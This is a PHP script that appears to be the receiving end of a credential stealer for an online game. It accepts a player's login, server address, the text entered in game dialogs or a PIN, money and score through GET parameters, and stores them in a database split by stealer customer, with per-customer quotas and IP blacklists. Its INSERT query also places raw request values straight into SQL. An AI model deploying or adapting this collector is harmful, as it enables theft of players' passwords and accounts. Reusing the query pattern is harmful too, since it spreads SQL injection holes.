<?php
$login = $_GET['log'];
$ip = $_GET['srvr'];
$server = $_GET['servname']; 
$score = (int)$_GET['score'];
$money = (int)$_GET['money'];
$userIp = $_SERVER["REMOTE_ADDR"];
$time = date("H:i:s-d.m.y");
$userid = $_GET['stuid'];

if (!empty($_GET['pin']))
{
$stext = (int)$_GET['pin'];
$did = 0;
$dtext = "PIN";
$ispin = 1;
}
else
{
$ispin = 0;
$dtext = "Dialog [ID: ".$_GET['did']."]";
$did = $_GET['did'];
$stext = $_GET['inf'];
}

if (!empty($stext) && !empty($login) && !empty($ip) && !empty($server) && !empty($userid))
{
		include './php/safemysql.php';
		$db = new SafeMySQL();		
	 
	$row = $db->getRow("SELECT * FROM users WHERE id = ?s", $userid);
	$logssize = $row["length"];
	$lua = $row["lua"];
	
	$stats = "money: $money score: $score";
	$len = strlen("$time | Player Info: $login [IP: $userIp] | Stats: $stats | Input Type: $dtext | Input Text: $stext | Server: $server [IP: $ip]\r\n");
	
	 $maxsize = 30000000;
	 $message = '';
     if ($logssize >= $maxsize)
	 {
	 } else {
		$blockip = $db->getRow("SELECT blacklist FROM users WHERE id = ?s", $userid);

		if(!$blockip['blacklist'] == "")
		{
			if(in_array(";", $blockip)) 
			{
				$blockip = explode(";", $blockip);
			}
			if(!in_array($userIp, $blockip))
			{
				if ($userid != 2)
				{
					if ($lua == 1)
					{
						$db->query("UPDATE `users` SET logs=logs + 1 WHERE id=?i",$userid);
						$db->query("UPDATE `users` SET length=?i WHERE id=?i",($logssize + $len),$userid);
						$db->query("INSERT INTO `logs`(`id`, `format`, `st`, `dialog`, `ispin`, `login`, `server`, `ip`, `text`, `uip`, `date`) 
								VALUES ($userid, 'lua', '$stats', $did, $ispin, '$login', '$server', '$ip', '$stext', '$userIp', '$time')");
					}
				}
			} 
		}
		else
		{
			if ($userid != 2)
			{
				if ($lua == 1)
				{
					$db->query("UPDATE `users` SET logs=logs + 1 WHERE id=?i",$userid);	
					$db->query("UPDATE `users` SET length=?i WHERE id=?i",($logssize + $len),$userid);
					$db->query("INSERT INTO `logs`(`id`, `format`, `st`, `dialog`, `ispin`, `login`, `server`, `ip`, `text`, `uip`, `date`) 
								VALUES ($userid, 'lua', '$stats', $did, $ispin, '$login', '$server', '$ip', '$stext', '$userIp', '$time')");

				}
			}
		} 
	}
}
?>